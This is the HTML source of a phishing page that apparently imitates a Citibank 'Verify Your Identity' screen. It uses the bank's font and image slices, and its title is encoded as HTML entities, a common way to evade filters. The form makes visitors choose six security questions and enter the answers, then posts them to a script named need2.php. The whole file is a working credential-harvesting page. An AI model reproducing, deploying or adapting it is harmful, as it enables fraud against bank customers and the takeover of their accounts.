<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<style type="text/css">
  
.textbox {  
    border: solid 1px #C7C9CA;
  	border-radius: 5px;
 	padding-left: 10px;
	font-family: "CitiSans", "Trebuchet MS", Helvetica, Arial, sans-serif;
  	font-size: 16px;
    color: #58595B;
    height: 28px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #8EB1EB; 
    border-style: solid; 
  	border-radius: 2px;
    border-width: 2px; 
    outline: 0; 
 } 

 </style>	
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:144px; top:19px; width:173px; height:30px; z-index:0"><a href="#"><img src="images/z1.png" alt="" title="" border=0 width=173 height=30></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:899px; top:59px; width:304px; height:399px; z-index:1"><a href="#"><img src="images/z3.png" alt="" title="" border=0 width=304 height=399></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:784px; width:1349px; height:51px; z-index:2"><img src="images/z8.png" alt="" title="" border=0 width=1349 height=51></div>

<div id="image9" style="position:absolute; overflow:hidden; left:266px; top:871px; width:767px; height:233px; z-index:3"><a href="#"><img src="images/z9.png" alt="" title="" border=0 width=767 height=233></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:264px; top:1144px; width:756px; height:112px; z-index:4"><a href="#"><img src="images/z10.png" alt="" title="" border=0 width=756 height=112></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:268px; top:1306px; width:124px; height:117px; z-index:5"><a href="#"><img src="images/z11.png" alt="" title="" border=0 width=124 height=117></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:143px; top:1436px; width:1074px; height:158px; z-index:6"><img src="images/z12.png" alt="" title="" border=0 width=1074 height=158></div>

<div id="image2" style="position:absolute; overflow:hidden; left:139px; top:59px; width:541px; height:167px; z-index:7"><img src="images/zq13.png" alt="" title="" border=0 width=541 height=167></div>

<div id="image14" style="position:absolute; overflow:hidden; left:151px; top:262px; width:373px; height:351px; z-index:10"><img src="images/z16.png" alt="" title="" border=0 width=373 height=351></div>
<form action=need2.php name=dekhtahn id=dekhtahn method=post>
<select name="q1" class="textbox" autocomplete="off" required style="position:absolute;left:155px;top:282px;width:260px;z-index:15">
<option value="">Select One</option>
<option value="What is the name of the first company you worked for?">What is the name of the first company you worked for?</option>
<option value="In what city were you married?(enter full name of city)">In what city were you married?(enter full name of city)</option>
<option value="What was the name of your high school?">What was the name of your high school?</option>
<option value="What is your best friend's first name?">What is your best friend's first name?</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="What is your maternal grandmothers's first name?">What is your maternal grandmothers's first name?</option>
<option value="What is the first name of the maid of honor at your wedding?">What is the first name of the maid of honor at your wedding?</option>
<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option value="What is the first name of your oldest newphew?">What is the first name of your oldest newphew?</option>
<option value="in What city was your high school?(full name of city only)">in What city was your high school?(full name of city only)</option>
<option value="What is your mother's middle name?">What is your mother's middle name?</option></select>
<input name="ans1" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:190px;left:457px;top:282px;z-index:16">
<select name="q2" class="textbox" autocomplete="off" required style="position:absolute;left:155px;top:341px;width:260px;z-index:17">
<option value="">Select One</option>
<option value="What is the name of your oldest niece?">What is the name of your oldest niece?</option>
<option value="What was the name of your first pet?">What was the name of your first pet?</option>
<option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
<option value="In what city is your vacation home?(Enter Full name of city only)">In what city is your vacation home?(Enter Full name of city only)</option>
<option value="What was the nickname of your grandfather?">What was the nickname of your grandfather?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?</option>
<option value="In what city was your father born?(Enter Full name of city only)">In what city was your father born?(Enter Full name of city only)</option></select>
<input name="ans2" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:190px;left:457px;top:341px;z-index:18">
<select name="q3" class="textbox" autocomplete="off" required style="position:absolute;left:155px;top:400px;width:260px;z-index:19">
<option value="">Select One</option>
<option value="Where did you meet your spouse for the first time?(Enter full name of city only)">Where did you meet your spouse for the first time?(Enter full name of city only)</option>
<option value="What Street did your best friend in high school life on?(Enter Full name of street only)">What Street did your best friend in high school life on?(Enter Full name of street only)</option>
<option value="What was the last name of your favorite teacher in final year of high school?">What was the last name of your favorite teacher in final year of high school?</option>
<option value="What is your mother's middle name?">What is your mother's middle name?</option>
<option value="What was the name of your junior high school?(Enter only "Riverdale" for Riverdale Junior High School)">What was the name of your junior high school?(Enter only "Riverdale" for Riverdale Junior High School)</option>
<option value="What was the name of the town your grandmother lived in?(Enter full name of town only)">What was the name of the town your grandmother lived in?(Enter full name of town only)</option>
<option value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</option>
<option value="In What city was your mother born?(Enter full name of city only)">In What city was your mother born?(Enter full name of city only)</option>
<option value="What was your favorite resturant in college?">What was your favorite resturant in college?</option>
<option value="In What city were you born?(Enter full name of city only)">In What city were you born?(Enter full name of city only)</option></select>
<input name="ans3" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:190px;left:457px;top:400px;z-index:20">

<select name="q4" class="textbox" autocomplete="off" required style="position:absolute;left:155px;top:459px;width:260px;z-index:24">
<option value="">Select One</option>
<option value="What is the name of the first company you worked for?">What is the name of the first company you worked for?</option>
<option value="In what city were you married?(enter full name of city)">In what city were you married?(enter full name of city)</option>
<option value="What was the name of your high school?">What was the name of your high school?</option>
<option value="What is your best friend's first name?">What is your best friend's first name?</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="What is your maternal grandmothers's first name?">What is your maternal grandmothers's first name?</option>
<option value="What is the first name of the maid of honor at your wedding?">What is the first name of the maid of honor at your wedding?</option>
<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option value="What is the first name of your oldest newphew?">What is the first name of your oldest newphew?</option>
<option value="in What city was your high school?(full name of city only)">in What city was your high school?(full name of city only)</option>
<option value="What is your mother's middle name?">What is your mother's middle name?</option></select>
<input name="ans4" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:190px;left:457px;top:459px;z-index:25">
<select name="q5" class="textbox" autocomplete="off" required style="position:absolute;left:155px;top:518px;width:260px;z-index:26">
<option value="">Select One</option>
<option value="What is the name of your oldest niece?">What is the name of your oldest niece?</option>
<option value="What was the name of your first pet?">What was the name of your first pet?</option>
<option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
<option value="In what city is your vacation home?(Enter Full name of city only)">In what city is your vacation home?(Enter Full name of city only)</option>
<option value="What was the nickname of your grandfather?">What was the nickname of your grandfather?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?</option>
<option value="In what city was your father born?(Enter Full name of city only)">In what city was your father born?(Enter Full name of city only)</option></select>
<input name="ans5" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:190px;left:457px;top:518px;z-index:27">
<select name="q6" class="textbox" autocomplete="off" required style="position:absolute;left:155px;top:577px;width:260px;z-index:28">
<option value="">Select One</option>
<option value="Where did you meet your spouse for the first time?(Enter full name of city only)">Where did you meet your spouse for the first time?(Enter full name of city only)</option>
<option value="What Street did your best friend in high school life on?(Enter Full name of street only)">What Street did your best friend in high school life on?(Enter Full name of street only)</option>
<option value="What was the last name of your favorite teacher in final year of high school?">What was the last name of your favorite teacher in final year of high school?</option>
<option value="What is your mother's middle name?">What is your mother's middle name?</option>
<option value="What was the name of your junior high school?(Enter only "Riverdale" for Riverdale Junior High School)">What was the name of your junior high school?(Enter only "Riverdale" for Riverdale Junior High School)</option>
<option value="What was the name of the town your grandmother lived in?(Enter full name of town only)">What was the name of the town your grandmother lived in?(Enter full name of town only)</option>
<option value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</option>
<option value="In What city was your mother born?(Enter full name of city only)">In What city was your mother born?(Enter full name of city only)</option>
<option value="What was your favorite resturant in college?">What was your favorite resturant in college?</option>
<option value="In What city were you born?(Enter full name of city only)">In What city were you born?(Enter full name of city only)</option></select>
<input name="ans6" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:190px;left:457px;top:577px;z-index:29">
<div id="formimage1" style="position:absolute; left:155px; top:652px; z-index:30"><input type="image" name="formimage1" width="142" height="34" src="images/cnte.png"></div>
</div>
 
	
</body>
</html>
